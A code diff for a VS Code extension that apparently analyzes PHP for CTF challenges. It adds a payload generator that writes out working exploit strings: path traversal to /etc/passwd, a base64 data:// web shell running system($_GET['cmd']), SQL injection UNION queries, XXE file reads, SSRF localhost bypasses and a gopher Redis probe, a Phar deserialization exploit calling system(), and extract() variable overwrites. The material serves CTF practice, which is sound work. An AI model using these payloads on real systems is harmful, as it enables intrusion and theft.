@@ -29,56 +29,17 @@ export function activate(context: vscode.ExtensionContext) {
         isWholeLine: true
     });
 
-    // Start the graph server
-    const config = vscode.workspace.getConfiguration('phpAnalyzer');
-    const port = config.get<number>('graphServerPort') || 3000;
-    graphServer = new GraphServer(port);
-    
-    // Register highlight callback - this gets called when user clicks nodes in web UI
-    graphServer.setHighlightCallback((filePath: string, line: number, column?: number) => {
-        highlightInEditor(filePath, line, column || 0);
-    });
-    
-    graphServer.start().then((success) => {
-        if (success) {
-            console.log(`Graph visualization server started on port ${port}`);
-        } else {
-            vscode.window.showWarningMessage(`Failed to start graph server on port ${port}. Graph visualization will not be available.`);
-        }
-    });
-
     // Initialize providers
     const analysisResultsProvider = new AnalysisResultsProvider();
     const codeGraphProvider = new CodeGraphProvider(context.extensionUri);
 
     // Register tree view
     vscode.window.registerTreeDataProvider('phpAnalysisResults', analysisResultsProvider);
-    
-    // Register webview provider (keep for backward compatibility)
-    vscode.window.registerWebviewViewProvider('phpCodeGraph', codeGraphProvider);
 
     // Register commands
     context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.trackVariableFlow', async () => {
-            await trackVariableFlow(analysisResultsProvider);
-        })
-    );
-
-    context.subscriptions.push(
         vscode.commands.registerCommand('phpAnalyzer.analyzeClassRelations', async () => {
             await analyzeClassRelations(analysisResultsProvider);
-        })
-    );
-
-    context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.showMagicMethods', async () => {
-            await showMagicMethods(analysisResultsProvider);
-        })
-    );
-
-    context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.findSerializationPoints', async () => {
-            await findSerializationPoints(analysisResultsProvider);
         })
     );
 
@@ -91,12 +52,6 @@ export function activate(context: vscode.ExtensionContext) {
     context.subscriptions.push(
         vscode.commands.registerCommand('phpAnalyzer.fullSecurityAnalysis', async () => {
             await fullSecurityAnalysis(analysisResultsProvider, codeGraphProvider);
-        })
-    );
-
-    context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.analyzeAttackChains', async () => {
-            await analyzeAttackChains(analysisResultsProvider, codeGraphProvider);
         })
     );
 
@@ -118,17 +73,28 @@ export function activate(context: vscode.ExtensionContext) {
         })
     );
 
-    context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.showInheritanceGraph', async () => {
-            await showInheritanceGraph(codeGraphProvider);
-        })
-    );
+    // Start the graph server (after commands are registered so activation never fails silently)
+    try {
+        const config = vscode.workspace.getConfiguration('phpAnalyzer');
+        const port = config.get<number>('graphServerPort') || 3000;
+        graphServer = new GraphServer(port);
 
-    context.subscriptions.push(
-        vscode.commands.registerCommand('phpAnalyzer.showDataFlowGraph', async () => {
-            await showDataFlowGraph(codeGraphProvider);
-        })
-    );
+        // Register highlight callback - this gets called when user clicks nodes in web UI
+        graphServer.setHighlightCallback((filePath: string, line: number, column?: number) => {
+            highlightInEditor(filePath, line, column || 0);
+        });
+
+        graphServer.start().then((success) => {
+            if (success) {
+                console.log(`Graph visualization server started on port ${port}`);
+            } else {
+                vscode.window.showWarningMessage(`Failed to start graph server on port ${port}. Graph visualization will not be available.`);
+            }
+        });
+    } catch (error: any) {
+        console.error('Failed to initialize graph server:', error);
+        vscode.window.showWarningMessage(`Graph server failed to start: ${error?.message || error}`);
+    }
 
     // Auto-analyze on open if enabled
     vscode.workspace.onDidOpenTextDocument((document) => {
@@ -618,32 +584,314 @@ async function generateExploitPayload() {
     const docInfo = await getActivePhpDocument();
     if (!docInfo) {return;}
 
-    try {
-        const analyzer = new PHPAnalyzer(docInfo.text);
-        const config = vscode.workspace.getConfiguration('phpAnalyzer');
-        const maxDepth = config.get<number>('maxChainDepth') || 5;
-        
-        const attackAnalyzer = new AttackChainAnalyzer(analyzer.getAST(), maxDepth);
-        const chains = attackAnalyzer.analyzeAttackChains(docInfo.document);
+    await vscode.window.withProgress({
+        location: vscode.ProgressLocation.Notification,
+        title: 'Analyzing code and generating payload...',
+        cancellable: false
+    }, async (progress) => {
+        try {
+            progress.report({ increment: 0, message: 'Parsing PHP code...' });
+            const analyzer = new PHPAnalyzer(docInfo.text);
+            const config = vscode.workspace.getConfiguration('phpAnalyzer');
+            const maxDepth = config.get<number>('maxChainDepth') || 5;
+            
+            progress.report({ increment: 30, message: 'Detecting POP chains...' });
+            // 首先尝试用 POPChainDetector 找 POP 链
+            const popDetector = new POPChainDetector();
+            const popChains = popDetector.findPOPChains(docInfo.text);
+            
+            if (popChains.length > 0) {
+                progress.report({ increment: 100, message: 'Found POP chains!' });
+                const items = popChains.map((chain, index) => ({
+                    label: `🔗 ${chain.entryClass}::${chain.entryMethod} → ${chain.finalSink}`,
+                    description: `${chain.riskLevel} - ${chain.vulnType || 'pop_chain'}`,
+                    detail: chain.description,
+                    chain: chain,
+                    index: index
+                }));
 
-        if (chains.length === 0) {
-            vscode.window.showWarningMessage('No attack chains found. Run "Analyze Attack Chains" first.');
-            return;
-        }
+                const selected = await vscode.window.showQuickPick(items, {
+                    placeHolder: 'Select a POP chain to generate exploit payload'
+                });
 
-        const generator = new PayloadGenerator();
-        const payload = await generator.generatePayload(chains, docInfo.document);
-        
-        if (payload) {
-            const doc = await vscode.workspace.openTextDocument({
-                content: payload,
-                language: 'php'
-            });
-            await vscode.window.showTextDocument(doc);
+                if (selected && selected.chain.payload) {
+                    const doc = await vscode.workspace.openTextDocument({
+                        content: selected.chain.payload,
+                        language: 'php'
+                    });
+                    await vscode.window.showTextDocument(doc);
+                    vscode.window.showInformationMessage('POP chain payload generated!');
+                }
+                return;
+            }
+
+            progress.report({ increment: 50, message: 'Analyzing attack chains...' });
+            // 尝试 AttackChainAnalyzer
+            const attackAnalyzer = new AttackChainAnalyzer(analyzer.getAST(), maxDepth);
+            const chains = attackAnalyzer.analyzeAttackChains(docInfo.document);
+
+            if (chains.length > 0) {
+                progress.report({ increment: 100, message: 'Found attack chains!' });
+                const generator = new PayloadGenerator();
+                const payload = await generator.generatePayload(chains, docInfo.document);
+                
+                if (payload) {
+                    const doc = await vscode.workspace.openTextDocument({
+                        content: payload,
+                        language: 'php'
+                    });
+                    await vscode.window.showTextDocument(doc);
+                }
+                return;
+            }
+
+            progress.report({ increment: 70, message: 'Scanning vulnerabilities...' });
+            // 用 VulnerabilityScanner 找漏洞并生成解题 payload
+            const vulnScanner = new VulnerabilityScanner(analyzer.getAST());
+            const vulnResults = vulnScanner.scanVulnerabilities(docInfo.document);
+            
+            const vulns = vulnResults.map(r => ({
+                id: (r.type.match(/\[([A-Z]+-\d+)\]/) || ['', r.type])[1] || r.type,
+                name: r.message,
+                description: r.details || '',
+                line: r.location?.range?.start?.line || 0
+            }));
+            
+            if (vulns.length === 0) {
+                vscode.window.showWarningMessage('No vulnerabilities found in the code.');
+                return;
+            }
+
+            progress.report({ increment: 100, message: 'Generating payload...' });
+            const payload = generateVulnerabilityPayload(vulns, docInfo.text);
+            if (payload) {
+                const doc = await vscode.workspace.openTextDocument({
+                    content: payload,
+                    language: 'php'
+                });
+                await vscode.window.showTextDocument(doc);
+                vscode.window.showInformationMessage(`Generated exploit for ${vulns.length} vulnerability(ies)!`);
+            }
+        } catch (error: any) {
+            vscode.window.showErrorMessage(`Error generating payload: ${error.message}`);
         }
-    } catch (error: any) {
-        vscode.window.showErrorMessage(`Error generating payload: ${error.message}`);
+    });
+}
+
+// 根据漏洞类型生成解题 payload
+function generateVulnerabilityPayload(vulns: any[], sourceCode: string): string {
+    let payload = `<?php\n/**\n * CTF Challenge Solution\n * Generated by PHP Code Analyzer for CTF\n */\n\n`;
+    
+    for (const vuln of vulns) {
+        payload += `// ═══════════════════════════════════════════════════════════\n`;
+        payload += `// 漏洞: ${vuln.name}\n`;
+        payload += `// ID: ${vuln.id}\n`;
+        payload += `// 行号: ${vuln.line}\n`;
+        payload += `// ═══════════════════════════════════════════════════════════\n\n`;
+        
+        switch (vuln.id) {
+            case 'WEAK-001':
+                payload += generateIntvalBypassPayload(vuln, sourceCode);
+                break;
+            case 'LFI-001':
+                payload += generateLFIPayload(vuln);
+                break;
+            case 'SQL-001':
+                payload += generateSQLiPayload(vuln);
+                break;
+            case 'XXE-001':
+                payload += generateXXEPayload(vuln);
+                break;
+            case 'SSRF-001':
+                payload += generateSSRFPayload(vuln);
+                break;
+            case 'PHAR-001':
+                payload += generatePharPayload(vuln);
+                break;
+            case 'VAR-001':
+                payload += generateExtractPayload(vuln);
+                break;
+            default:
+                payload += `// TODO: 分析漏洞 ${vuln.id} 并构造 payload\n`;
+                payload += `// 描述: ${vuln.description}\n\n`;
+        }
     }
+    
+    return payload;
+}
+
+function generateIntvalBypassPayload(vuln: any, sourceCode: string): string {
+    let payload = `/*\n`;
+    payload += ` * intval() 绕过技巧\n`;
+    payload += ` * \n`;
+    payload += ` * intval($x) - 默认十进制解析\n`;
+    payload += ` * intval($x, 0) - 自动检测进制 (0x=十六进制, 0=八进制, 其他=十进制)\n`;
+    payload += ` */\n\n`;
+    
+    // 尝试从源码中提取目标值
+    const match = sourceCode.match(/intval\s*\(\s*\$\w+\s*,\s*0\s*\)\s*[=!]=\s*(\d+)/);
+    const targetValue = match ? parseInt(match[1]) : 47;
+    
+    payload += `// 目标值: ${targetValue}\n`;
+    payload += `// 八进制表示: 0${targetValue.toString(8)}\n`;
+    payload += `// 十六进制表示: 0x${targetValue.toString(16)}\n\n`;
+    
+    payload += `// 绕过方法 1: 使用八进制\n`;
+    payload += `$payload1 = "0${targetValue.toString(8)}";  // 八进制 = ${targetValue}\n`;
+    payload += `echo "intval('$payload1') = " . intval($payload1) . "\\n";        // 结果: 0 (十进制解析前导0)\n`;
+    payload += `echo "intval('$payload1', 0) = " . intval($payload1, 0) . "\\n";  // 结果: ${targetValue} (八进制解析)\n\n`;
+    
+    payload += `// 绕过方法 2: 使用十六进制\n`;
+    payload += `$payload2 = "0x${targetValue.toString(16)}";  // 十六进制 = ${targetValue}\n`;
+    payload += `echo "intval('$payload2') = " . intval($payload2) . "\\n";        // 结果: 0\n`;
+    payload += `echo "intval('$payload2', 0) = " . intval($payload2, 0) . "\\n";  // 结果: ${targetValue}\n\n`;
+    
+    payload += `// ==================== 解题 Payload ====================\n`;
+    payload += `// POST 参数: newstar2025=0${targetValue.toString(8)}\n`;
+    payload += `// 或: newstar2025=0x${targetValue.toString(16)}\n`;
+    payload += `\n`;
+    payload += `// curl 命令:\n`;
+    payload += `// curl -X POST -d "newstar2025=0${targetValue.toString(8)}" http://target/challenge.php\n\n`;
+    
+    return payload;
+}
+
+function generateLFIPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * 本地文件包含 (LFI) 利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `// 读取 /etc/passwd\n`;
+    payload += `$lfi1 = "../../../etc/passwd";\n\n`;
+    
+    payload += `// 读取 flag (常见位置)\n`;
+    payload += `$lfi2 = "../../../flag";\n`;
+    payload += `$lfi3 = "../../../flag.php";\n`;
+    payload += `$lfi4 = "../../../flag.txt";\n\n`;
+    
+    payload += `// 使用 PHP 伪协议读取源码\n`;
+    payload += `$lfi5 = "php://filter/read=convert.base64-encode/resource=index.php";\n\n`;
+    
+    payload += `// 使用 data 伪协议执行代码\n`;
+    payload += `$lfi6 = "data://text/plain,<?php phpinfo();?>";\n`;
+    payload += `$lfi7 = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=";\n\n`;
+    
+    return payload;
+}
+
+function generateSQLiPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * SQL 注入利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `// 基础注入测试\n`;
+    payload += `$sqli1 = "' OR '1'='1";\n`;
+    payload += `$sqli2 = "' OR 1=1--";\n`;
+    payload += `$sqli3 = "' UNION SELECT 1,2,3--";\n\n`;
+    
+    payload += `// 读取数据库信息\n`;
+    payload += `$sqli4 = "' UNION SELECT database(),user(),version()--";\n\n`;
+    
+    payload += `// 读取表名\n`;
+    payload += `$sqli5 = "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--";\n\n`;
+    
+    return payload;
+}
+
+function generateXXEPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * XXE (XML 外部实体) 利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `$xxe_payload = <<<XML\n`;
+    payload += `<?xml version="1.0" encoding="UTF-8"?>\n`;
+    payload += `<!DOCTYPE foo [\n`;
+    payload += `  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n`;
+    payload += `]>\n`;
+    payload += `<root>&xxe;</root>\n`;
+    payload += `XML;\n\n`;
+    
+    payload += `// 读取 flag\n`;
+    payload += `$xxe_flag = <<<XML\n`;
+    payload += `<?xml version="1.0"?>\n`;
+    payload += `<!DOCTYPE foo [\n`;
+    payload += `  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">\n`;
+    payload += `]>\n`;
+    payload += `<root>&xxe;</root>\n`;
+    payload += `XML;\n\n`;
+    
+    return payload;
+}
+
+function generateSSRFPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * SSRF (服务端请求伪造) 利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `// 绕过 localhost 过滤\n`;
+    payload += `$ssrf1 = "http://127.0.0.1/";      // 可能被过滤\n`;
+    payload += `$ssrf2 = "http://127.1/";          // 短格式\n`;
+    payload += `$ssrf3 = "http://0.0.0.0/";        // 所有接口\n`;
+    payload += `$ssrf4 = "http://[::1]/";          // IPv6 本地\n`;
+    payload += `$ssrf5 = "http://0/";              // 十进制 0\n`;
+    payload += `$ssrf6 = "http://2130706433/";    // 127.0.0.1 的十进制\n\n`;
+    
+    payload += `// 读取本地文件\n`;
+    payload += `$ssrf7 = "file:///etc/passwd";\n`;
+    payload += `$ssrf8 = "file:///flag";\n\n`;
+    
+    payload += `// 探测内网服务\n`;
+    payload += `$ssrf9 = "http://192.168.1.1/";\n`;
+    payload += `$ssrf10 = "gopher://127.0.0.1:6379/_*1%0d%0a...";\n\n`;
+    
+    return payload;
+}
+
+function generatePharPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * Phar 反序列化利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `// 步骤 1: 创建恶意 Phar 文件\n`;
+    payload += `class Exploit {\n`;
+    payload += `    public $cmd = "cat /flag";\n`;
+    payload += `    public function __destruct() {\n`;
+    payload += `        system($this->cmd);\n`;
+    payload += `    }\n`;
+    payload += `}\n\n`;
+    
+    payload += `$phar = new Phar("exploit.phar");\n`;
+    payload += `$phar->startBuffering();\n`;
+    payload += `$phar->addFromString("test.txt", "test");\n`;
+    payload += `$phar->setStub("<?php __HALT_COMPILER(); ?>");\n`;
+    payload += `$phar->setMetadata(new Exploit());\n`;
+    payload += `$phar->stopBuffering();\n\n`;
+    
+    payload += `// 步骤 2: 上传并触发\n`;
+    payload += `// 使用 phar:// 协议触发反序列化\n`;
+    payload += `// ?url=phar://./uploads/exploit.phar/test.txt\n\n`;
+    
+    return payload;
+}
+
+function generateExtractPayload(vuln: any): string {
+    let payload = `/*\n`;
+    payload += ` * extract() 变量覆盖利用\n`;
+    payload += ` */\n\n`;
+    
+    payload += `// extract() 会将数组的键值对导入为变量\n`;
+    payload += `// 可以覆盖已存在的变量\n\n`;
+    
+    payload += `// 示例: 覆盖 $flag 变量\n`;
+    payload += `// ?flag=hacked\n\n`;
+    
+    payload += `// 覆盖文件路径变量\n`;
+    payload += `// ?file=../../../etc/passwd\n\n`;
+    
+    payload += `// 覆盖认证变量\n`;
+    payload += `// ?is_admin=1&password=anything\n\n`;
+    
+    return payload;
 }
 
 async function showCodeGraph(provider: CodeGraphProvider) {
